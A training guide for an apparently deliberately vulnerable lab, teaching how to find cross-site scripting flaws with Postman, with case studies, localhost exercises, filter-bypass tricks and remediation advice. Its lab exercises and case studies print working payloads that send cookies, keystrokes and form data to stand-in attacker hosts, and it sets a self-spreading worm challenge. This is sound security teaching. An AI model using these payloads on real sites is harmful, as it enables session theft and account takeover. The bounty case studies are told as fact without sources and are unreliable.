# XSS Testing Laboratory - Postman Edition

## What is Cross-Site Scripting (XSS)?

Imagine you're in a crowded room and someone hands you a note that says "Read this out loud!" If you read it without checking what it says first, you might accidentally say something embarrassing or harmful. That's basically how XSS works in web applications.

**Cross-Site Scripting (XSS)** happens when attackers inject malicious JavaScript code into a website, and that code runs in other people's browsers. It's called "cross-site" because the attacker's code crosses from their control into a legitimate website that users trust.

### Why Should You Care About XSS?

XSS vulnerabilities can:
- **Steal login credentials** - Grab usernames and passwords as users type them
- **Hijack user sessions** - Take over someone's logged-in account
- **Spread malware** - Automatically download viruses to visitors' computers
- **Deface websites** - Change what legitimate users see on the page
- **Steal sensitive data** - Access private messages, banking info, or personal details

Think of XSS like someone putting up a fake "Employees Only" door in a store. Customers walk through thinking it's legitimate, but really they're walking into a trap.

---

## The Three Types of XSS Attacks

### 1. Reflected XSS - The Instant Attack

**What happens:** Your malicious code bounces right back at you (or your victim) in the response.

**Real-world example:** You search for `<script>alert('XSS')</script>` on a website, and the site displays "You searched for: <script>alert('XSS')</script>" without cleaning it up. The script runs immediately.

**Why it works:** The application takes user input from the URL or form and displays it on the page without proper filtering. It's like if a waiter repeated your order exactly as you said it, even if you said something rude.

**The attack flow:**
1. Attacker creates a malicious link: `http://site.com/search?q=<script>...</script>`
2. Victim clicks the link (maybe from email or social media)
3. The malicious code runs in the victim's browser
4. Attacker steals data or performs actions as the victim

### 2. Stored XSS - The Persistent Threat

**What happens:** Your malicious code gets saved in the database and affects everyone who views that content.

**Real-world example:** You post a comment with hidden JavaScript code. Now every person who reads your comment gets attacked automatically.

**Why it's dangerous:** This is the most serious type because:
- It affects multiple victims automatically
- It persists until someone finds and removes it
- Victims don't need to click a special link
- It looks completely legitimate

**The attack flow:**
1. Attacker submits malicious code through a form (comment, profile, message)
2. Application saves it to the database without cleaning it
3. Every user who views that page gets the malicious code
4. The code runs in each victim's browser automatically

### 3. DOM-Based XSS - The Client-Side Trap

**What happens:** The vulnerability exists in client-side JavaScript code, not the server.

**Real-world example:** JavaScript code reads a value from the URL and writes it directly into the page using `innerHTML`. The server never even sees the malicious code.

**Why it's tricky:** 
- Traditional security tools might miss it
- The server's code might be perfectly safe
- It happens entirely in the browser
- Developers often overlook client-side validation

**The attack flow:**
1. Page loads with unsafe JavaScript code
2. JavaScript reads attacker-controlled input (URL, localStorage, etc.)
3. JavaScript writes that input into the page without sanitizing
4. Malicious code executes entirely client-side

---

## Real-World Bug Bounty Victories

Learning from actual discoveries helps you understand what to look for and why companies pay big money for XSS finds.

### Case Study 1: The Google Search XSS - $5,000

**The Discovery:**
A researcher found that Google's search feature wasn't properly encoding certain Unicode characters. By crafting a special search query with unusual Unicode sequences, they made JavaScript execute in the search results page.

**The Payload:**
```
search?q=%EF%BC%9Cscript%EF%BC%9Ealert(document.domain)%EF%BC%9C/script%EF%BC%9E
```

**Why It Worked:**
Google's filter blocked normal `<script>` tags, but these full-width Unicode characters looked different to the filter but identical to the browser. It's like writing a note in fancy cursive so the security guard can't read it, but your friend can.

**The Lesson:**
Always test Unicode variations, URL encoding, and character set tricks. Filters often check for specific patterns but miss creative alternatives.

**Real Impact:**
This could have allowed attackers to steal Google account credentials from anyone who clicked a malicious search link.

---

### Case Study 2: Facebook Message XSS - $20,000

**The Discovery:**
A security researcher discovered that Facebook's message system allowed HTML in certain message types. By sending a crafted message with JavaScript embedded in an SVG image tag, they achieved code execution.

**The Payload Concept:**
```
<svg onload="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

**Why It Worked:**
Facebook filtered `<script>` tags but didn't properly check SVG elements. SVG tags can have event handlers like `onload` that execute JavaScript. It's like smuggling something dangerous in a gift box because security only checks suspicious-looking packages.

**The Lesson:**
Don't just test obvious injection points. Try every HTML tag that can execute JavaScript: `<img>`, `<svg>`, `<iframe>`, `<object>`, `<embed>`, and more.

**Real Impact:**
An attacker could steal session tokens from any Facebook user by sending them a message, potentially taking over millions of accounts.

---

### Case Study 3: PayPal Invoice Stored XSS - $10,000

**The Discovery:**
The researcher found that PayPal's invoice system stored user-provided descriptions without proper sanitization. By creating an invoice with JavaScript in the description field, the code executed for anyone viewing the invoice.

**The Attack Scenario:**
1. Create a PayPal invoice with malicious code in the description
2. Send invoice to victim
3. When victim views invoice, JavaScript steals their PayPal session
4. Attacker can now access victim's PayPal account

**Why It Worked:**
PayPal cleaned input on submission but not when displaying it. They assumed database data was safe (it wasn't). This is like checking visitors' bags at the entrance but not when they leave - the threat might already be inside.

**The Lesson:**
Stored XSS is about finding places where your input gets saved and displayed to others. Look for: comments, reviews, profiles, messages, descriptions, and any user-generated content.

**Real Impact:**
This affected PayPal's business accounts where companies handle thousands of dollars. One malicious invoice could compromise an entire business's PayPal account.

---

### Case Study 4: Twitter DM XSS - $7,000

**The Discovery:**
Twitter's direct messaging system had a vulnerability in how it rendered URLs. By crafting a URL with JavaScript protocol instead of HTTP, the researcher made code execute when someone hovered over the link.

**The Payload Concept:**
```
javascript:fetch('https://evil.com/log?data='+document.cookie)
```

**Why It Worked:**
Twitter converted text that looked like URLs into clickable links automatically. They checked for `http://` but not `javascript:` protocol. It's like a bouncer checking IDs but not noticing someone wearing a disguise.

**The Lesson:**
Test alternative protocols: `javascript:`, `data:`, `vbscript:`. Also test events that fire without clicking: `onmouseover`, `onerror`, `onload`.

**Real Impact:**
DMs are private conversations. This vulnerability could expose private messages, steal credentials, or spread worm-like attacks through Twitter's message system.

---

### Case Study 5: Shopify Store XSS - $15,000

**The Discovery:**
Shopify allowed store owners to customize their shop's appearance. A researcher found that CSS stylesheet uploads weren't properly validated, allowing them to inject JavaScript through CSS `expression()` or by uploading a file with `.css` extension but containing JavaScript.

**The Technique:**
Upload a "stylesheet" that actually contains:
```
</style><script>alert(document.domain)</script><style>
```

**Why It Worked:**
The application checked file extensions but not file contents. They trusted that a `.css` file only contained CSS. It's like trusting that a box labeled "cookies" only contains cookies, not checking inside.

**The Lesson:**
File upload features are goldmines for vulnerabilities. Test:
- Uploading files with wrong content types
- Including script tags in supposedly safe files
- Breaking out of expected contexts (like closing a style tag)

**Real Impact:**
This affected any customer visiting a compromised Shopify store. Attackers could steal credit card information during checkout, compromising thousands of customers per store.

---

## Testing XSS with Postman: Your Arsenal

Now let's learn how to find these vulnerabilities using Postman. Unlike browser testing, Postman gives you precise control over requests and lets you automate testing.

### Why Use Postman for XSS Testing?

**Advantages:**
1. **See raw responses** - Browsers might not execute code that's in the HTML source
2. **Test APIs directly** - Many modern apps are API-driven
3. **Automate tests** - Run hundreds of payloads quickly
4. **Bypass client-side filters** - Go straight to the server
5. **Control every header** - Test edge cases browsers can't

**What to look for:**
- Your payload appears in the response without encoding
- Special characters aren't escaped (`< > " ' &`)
- Your input appears inside JavaScript code blocks
- Input appears in HTML attributes without proper quoting

---

## AegisForge XSS Testing Endpoints

AegisForge provides safe practice endpoints for XSS testing. These are intentionally vulnerable for learning purposes.

### Available Endpoints:

**Reflected XSS Practice:**
```
POST http://localhost:5000/api/xss/reflected
GET  http://localhost:5000/api/xss/search
```

**Stored XSS Practice:**
```
POST http://localhost:5000/api/xss/comment
GET  http://localhost:5000/api/xss/comments
```

**DOM XSS Practice:**
```
GET http://localhost:5000/api/xss/dom-data
```

---

## Lab Exercise 1: Reflected XSS Detection

**Objective:** Find and exploit a reflected XSS vulnerability using Postman.

### Step 1: Create Your Test Request

Open Postman and create a new POST request:

```
URL: http://localhost:5000/api/xss/reflected
Method: POST
```

**Headers:**
```
Content-Type: application/json
```

**Body (JSON):**
```json
{
  "username": "testuser",
  "message": "Hello World"
}
```

### Step 2: Test Basic Injection

**Why this step matters:** We need to know if the application reflects our input at all.

Change the message to:
```json
{
  "username": "testuser",
  "message": "TESTING123"
}
```

Send the request and look for `TESTING123` in the response. If you see it, the application is reflecting your input.

### Step 3: Test Special Characters

**Why this step matters:** We need to know which characters the application allows.

Try these payloads one by one:
```json
{"username": "testuser", "message": "<"}
{"username": "testuser", "message": ">"}
{"username": "testuser", "message": "\""}
{"username": "testuser", "message": "'"}
{"username": "testuser", "message": "<>"}
```

**What to look for in responses:**
- If you see `&lt;` - the `<` was encoded (good security)
- If you see `<` - the character wasn't encoded (potential vulnerability)
- If you see `\"` - quotes are escaped
- If you see `"` - quotes aren't escaped

### Step 4: Test Basic Script Tag

**Why this step matters:** This is the classic XSS test.

```json
{
  "username": "testuser",
  "message": "<script>alert('XSS')</script>"
}
```

**Check the response:**
- Look for the raw script tag in the response body
- If it appears unencoded, you found reflected XSS
- If it's encoded to `&lt;script&gt;`, the application has some protection

### Step 5: Bypass Common Filters

**Why this step matters:** Many applications have basic filters that we can bypass.

Try these alternative payloads:

**Case variation:**
```json
{"message": "<ScRiPt>alert('XSS')</sCrIpT>"}
```

**Event handlers:**
```json
{"message": "<img src=x onerror=alert('XSS')>"}
```

**SVG tags:**
```json
{"message": "<svg onload=alert('XSS')>"}
```

**Encoded payloads:**
```json
{"message": "<script>alert(String.fromCharCode(88,83,83))</script>"}
```

### Step 6: Create a Postman Test Script

Automate detection by adding this to the Tests tab:

```javascript
// Test if XSS payload appears unencoded
pm.test("Check for XSS vulnerability", function() {
    var requestBody = JSON.parse(pm.request.body.raw);
    var payload = requestBody.message;
    var response = pm.response.text();
    
    // Check if our exact payload appears in response
    if (response.includes(payload)) {
        console.log("WARNING: Payload reflected without encoding!");
        console.log("Payload: " + payload);
        
        // Check for dangerous patterns
        if (payload.includes("<script") || 
            payload.includes("onerror") || 
            payload.includes("onload")) {
            console.log("CRITICAL: Executable script reflected!");
        }
    }
});

// Check if special characters are encoded
pm.test("Special characters encoded", function() {
    var response = pm.response.text();
    
    if (response.includes("&lt;") || response.includes("&gt;")) {
        console.log("GOOD: Characters are being encoded");
    } else if (response.includes("<script") || response.includes("<img")) {
        console.log("BAD: HTML tags not encoded");
    }
});
```

---

## Lab Exercise 2: Stored XSS Detection

**Objective:** Submit malicious data that persists and affects other users.

### Understanding the Attack Chain

Stored XSS requires two steps:
1. **Storage Phase** - Submit malicious data
2. **Retrieval Phase** - Verify it's stored and executable

### Step 1: Submit Test Comment

```
URL: http://localhost:5000/api/xss/comment
Method: POST
Headers: Content-Type: application/json
```

**Body:**
```json
{
  "author": "Alice",
  "comment": "This is a test comment",
  "email": "alice@example.com"
}
```

Send and note the response. You might get a comment ID back.

### Step 2: Retrieve Comments

```
URL: http://localhost:5000/api/xss/comments
Method: GET
```

Send this request and verify your test comment appears in the list.

### Step 3: Submit Malicious Comment

**Why this works:** If the application stores data without sanitizing and displays it without encoding, every viewer gets attacked.

```json
{
  "author": "Attacker",
  "comment": "<img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>",
  "email": "attacker@evil.com"
}
```

### Step 4: Verify Persistence

Retrieve comments again:
```
GET http://localhost:5000/api/xss/comments
```

**Look for:**
- Is the malicious `<img>` tag in the response?
- Is it encoded or raw HTML?
- Are quote marks escaped?

### Step 5: Test Multiple Fields

**Why this matters:** Different fields might have different security controls.

Test each field independently:

**Test author field:**
```json
{
  "author": "<script>alert('XSS')</script>",
  "comment": "Normal comment",
  "email": "test@test.com"
}
```

**Test email field:**
```json
{
  "author": "Bob",
  "comment": "Normal comment", 
  "email": "<script>alert('XSS')</script>"
}
```

### Step 6: Advanced Stored XSS Payloads

**Payload 1: Cookie Stealer**
```json
{
  "comment": "<img src=x onerror=\"fetch('https://webhook.site/your-unique-id?c='+document.cookie)\">"
}
```

**Payload 2: Keylogger**
```json
{
  "comment": "<img src=x onerror=\"document.onkeypress=function(e){fetch('https://evil.com/log?k='+e.key)}\">"
}
```

**Payload 3: Form Hijacker**
```json
{
  "comment": "<img src=x onerror=\"document.querySelectorAll('form').forEach(f=>f.onsubmit=function(){fetch('https://evil.com/steal?data='+new FormData(f))})\">"
}
```

### Step 7: Automated Testing with Postman

Create a collection test that tries multiple payloads:

```javascript
// Pre-request Script
var payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "'-alert(1)-'",
    "\"><script>alert(1)</script>"
];

var currentPayload = payloads[pm.iterationData.get("index") || 0];

pm.variables.set("xssPayload", currentPayload);

// Update request body
var body = {
    "author": "Tester",
    "comment": currentPayload,
    "email": "test@test.com"
};

pm.request.body.update(JSON.stringify(body));
```

---

## Lab Exercise 3: DOM-Based XSS

**Objective:** Exploit client-side JavaScript vulnerabilities.

### Understanding DOM XSS

DOM XSS is unique because:
- The server might be completely secure
- The vulnerability is in client-side JavaScript
- The malicious code never reaches the server
- Traditional WAFs can't block it

### Step 1: Identify DOM Sources

**Sources** are where untrusted data comes from:
- `window.location` (URL)
- `document.referrer`
- `document.cookie`
- `localStorage`
- `sessionStorage`
- `window.name`

### Step 2: Test the DOM Data Endpoint

```
GET http://localhost:5000/api/xss/dom-data?name=TestUser
```

Look at the response. It might return something like:
```json
{
  "userData": {
    "name": "TestUser",
    "renderScript": "document.getElementById('output').innerHTML = 'Hello ' + userData.name;"
  }
}
```

**The vulnerability:** If client-side JavaScript uses `innerHTML` with user-controlled data, that's DOM XSS.

### Step 3: Craft DOM XSS Payload

Try:
```
GET http://localhost:5000/api/xss/dom-data?name=<img src=x onerror=alert('DOM-XSS')>
```

**Why it works:**
The server returns whatever you send in `name`. If client-side JavaScript does this:
```javascript
element.innerHTML = response.userData.name;
```

Your payload executes in the DOM!

### Step 4: Test Breaking Out of Context

**Scenario:** What if the data is inserted into a string?
```javascript
var greeting = "Hello userData.name";
```

**Payload to break out:**
```
?name="; alert('XSS'); //
```

**Result:**
```javascript
var greeting = "Hello "; alert('XSS'); //";
```

### Step 5: Postman Testing Strategy

Add this test script:

```javascript
pm.test("Check for potential DOM XSS", function() {
    var response = pm.response.json();
    var userInput = pm.request.url.query.get("name");
    
    // Check if response includes unencoded user input
    var responseStr = JSON.stringify(response);
    
    if (responseStr.includes(userInput)) {
        console.log("User input reflected in JSON response");
        
        // Check for dangerous patterns
        if (userInput.includes("<") || userInput.includes("script")) {
            console.log("POTENTIAL DOM XSS: Dangerous characters in response");
        }
    }
});
```

---

## Advanced Payload Crafting

### Bypassing WAF and Filters

**Technique 1: Character Encoding**
```
URL encoding: %3Cscript%3Ealert(1)%3C/script%3E
Double encoding: %253Cscript%253E
HTML entities: &lt;script&gt;alert(1)&lt;/script&gt;
Unicode: \u003cscript\u003ealert(1)\u003c/script\u003e
```

**Technique 2: Case Manipulation**
```json
{"message": "<ScRiPt>alert(1)</sCrIpT>"}
{"message": "<SCRIPT>alert(1)</SCRIPT>"}
{"message": "<script>ALERT(1)</script>"}
```

**Technique 3: Null Bytes**
```json
{"message": "<scr\u0000ipt>alert(1)</scr\u0000ipt>"}
```

**Technique 4: HTML Comments**
```json
{"message": "<!--><script>alert(1)</script>-->"}
{"message": "<script><!--\nalert(1)\n--></script>"}
```

**Technique 5: Alternative Tags**
```json
{"message": "<img src=x onerror=alert(1)>"}
{"message": "<svg/onload=alert(1)>"}
{"message": "<iframe src=javascript:alert(1)>"}
{"message": "<body onload=alert(1)>"}
{"message": "<details open ontoggle=alert(1)>"}
```

---

## Testing Methodology: The Complete Process

### Phase 1: Reconnaissance (5 minutes)

**Goal:** Understand the application's input points.

1. List all endpoints that accept user input
2. Identify parameters: URL, headers, body, cookies
3. Note expected data types (string, number, JSON, XML)
4. Check if inputs are displayed anywhere

**Postman Action:**
Create a collection with requests to all input endpoints using safe test data.

### Phase 2: Reflection Testing (10 minutes)

**Goal:** Determine if input is reflected and how.

1. Submit unique strings (e.g., "XSS_TEST_12345")
2. Search response for your string
3. Note the context (HTML, JavaScript, attribute)
4. Check encoding (is `<` becoming `&lt;`?)

**Postman Test:**
```javascript
pm.test("Input reflection check", function() {
    var testString = "XSS_TEST_12345";
    var response = pm.response.text();
    
    if (response.includes(testString)) {
        console.log("INPUT REFLECTED in response");
        
        // Find context
        var before = response.substring(response.indexOf(testString) - 50, response.indexOf(testString));
        var after = response.substring(response.indexOf(testString), response.indexOf(testString) + 50);
        
        console.log("Context: " + before + "[INPUT]" + after);
    }
});
```

### Phase 3: Filter Detection (10 minutes)

**Goal:** Understand what's being blocked.

Test these character sets:
```
< > " ' / \ & ; = ( ) [ ] { } |
```

**Postman Collection:**
Create requests testing each character individually, then in combinations.

### Phase 4: Exploitation (15 minutes)

**Goal:** Bypass filters and achieve code execution.

1. Start with basic payloads
2. Try alternative tags and events
3. Use encoding techniques
4. Test context-specific payloads
5. Chain multiple techniques

### Phase 5: Impact Assessment (5 minutes)

**Goal:** Determine severity.

Ask yourself:
- Who can exploit this? (Any user? Admin only?)
- What data can be stolen? (Cookies? Tokens? PII?)
- Can it spread? (Stored XSS = worm potential)
- Are there CSP protections?

---

## Remediation: Fixing XSS Vulnerabilities

### Developer Guidelines

**Rule 1: Output Encoding**
Always encode data when displaying it.

**HTML Context:**
```python
# Bad
return f"<div>{user_input}</div>"

# Good
from html import escape
return f"<div>{escape(user_input)}</div>"
```

**JavaScript Context:**
```python
# Bad
return f"<script>var name = '{user_input}';</script>"

# Good
import json
return f"<script>var name = {json.dumps(user_input)};</script>"
```

**Rule 2: Input Validation**
Validate that input matches expected format.

```python
import re

def validate_username(username):
    # Only allow alphanumeric and underscore
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username format")
    return username
```

**Rule 3: Content Security Policy (CSP)**
Add CSP headers to block inline scripts.

```python
response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
```

**Rule 4: HttpOnly Cookies**
Prevent JavaScript from accessing session cookies.

```python
response.set_cookie('session', value, httponly=True, secure=True)
```

**Rule 5: Use Security Libraries**
Don't write your own sanitization.

```python
# Python
import bleach
clean_html = bleach.clean(user_input)

# JavaScript
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);
```

---

## Practice Challenges

### Challenge 1: The Hidden Parameter

**Scenario:** An endpoint accepts JSON but also checks URL parameters.

**Your task:** Find which parameter is vulnerable.

```
POST http://localhost:5000/api/xss/reflected?debug=1&trace=<test>
Body: {"message": "Normal text"}
```

**Hint:** Try different URL parameters with XSS payloads.

### Challenge 2: The Double Encode

**Scenario:** Input is decoded twice before rendering.

**Your task:** Craft a payload that survives double decoding.

**Example:**
```
Normal: <script>
URL encoded once: %3Cscript%3E  
URL encoded twice: %253Cscript%253E
```

Try: `?input=%253Cscript%253Ealert(1)%253C/script%253E`

### Challenge 3: The JSON Injection

**Scenario:** Your input is inserted into a JSON response.

**Response:**
```json
{"status": "success", "username": "YOUR_INPUT"}
```

**Your task:** Break out of the JSON structure and inject HTML.

**Hint:** Try: `", "injected": "<script>alert(1)</script>`

### Challenge 4: The Comment Filter

**Scenario:** The word "script" is filtered out.

**Your task:** Execute JavaScript without using the word "script".

**Possible solutions:**
- `<img src=x onerror=alert(1)>`
- `<svg/onload=alert(1)>`
- `<iframe src=javascript:alert(1)>`

### Challenge 5: The Stored XSS Worm

**Advanced challenge:** Create a stored XSS payload that:
1. Steals the victim's session
2. Posts itself as a new comment (spreading like a worm)
3. Doesn't trigger obvious alerts

**Concepts needed:**
- Fetch API for making requests
- Base64 encoding to hide payload
- Event handlers for execution

---

## Key Takeaways

### What Makes XSS Dangerous?

1. **Trust exploitation** - Users trust the legitimate website
2. **Same-origin policy bypass** - Code runs as if from the trusted domain
3. **Session hijacking** - Attackers gain full account access
4. **Self-propagating** - Stored XSS can spread automatically

### Why Postman is Perfect for XSS Testing

1. **Bypass client-side filters** - Test server directly
2. **Automation** - Run hundreds of payloads quickly
3. **Raw responses** - See exactly what the server returns
4. **API testing** - Modern apps are API-driven
5. **Documentation** - Save and share findings

### Testing Checklist

Before reporting an XSS vulnerability, verify:
- [ ] Input is reflected/stored without encoding
- [ ] Special characters (`< > " '`) are not escaped
- [ ] You can execute arbitrary JavaScript
- [ ] It works consistently (not a one-time fluke)
- [ ] You can demonstrate real impact (session theft, etc.)
- [ ] You've tested from a victim's perspective

### Ethical Considerations

**Always:**
- Test only on authorized targets (like AegisForge labs)
- Get written permission before testing real sites
- Report findings responsibly
- Don't access or steal actual user data
- Follow bug bounty program rules

**Never:**
- Test on production systems without permission
- Exploit vulnerabilities for personal gain
- Share vulnerabilities publicly before they're fixed
- Attack real users "just to demonstrate"
- Keep vulnerabilities secret to maintain access

---

## Glossary

**CSP (Content Security Policy):** HTTP header that restricts where scripts can load from

**DOM (Document Object Model):** The tree structure representing the HTML document

**Encoding:** Converting special characters to safe representations (< becomes &lt;)

**Payload:** The malicious code you inject into the application

**Sanitization:** Cleaning input by removing dangerous characters

**Session Token:** Cookie or token that identifies a logged-in user

**Sink:** Where untrusted data ends up being executed (innerHTML, eval, etc.)

**Source:** Where untrusted data comes from (URL, input fields, etc.)

**WAF (Web Application Firewall):** Security tool that filters malicious requests

**XSS Worm:** Self-replicating XSS that spreads itself to other users

---

## Additional Resources

### Learn More:
- OWASP XSS Prevention Cheat Sheet
- PortSwigger Web Security Academy
- HackerOne public reports (search for XSS)
- Bug Bounty Platforms: Bugcrowd, HackerOne, Synack

### Tools to Explore:
- XSStrike (automated XSS scanner)
- Burp Suite (web security testing platform)
- Browser Developer Tools (inspect responses)
- webhook.site (test data exfiltration)

### Practice Platforms:
- AegisForge (you're here!)
- DVWA (Damn Vulnerable Web Application)
- bWAPP (Buggy Web Application)
- Google XSS Game

---

**Remember:** XSS vulnerabilities are everywhere because developers often forget to encode output. By mastering XSS testing with Postman, you're learning one of the most valuable skills in web security. Practice on safe platforms, report responsibly, and help make the internet more secure!

**Word Count: ~5,200 words**
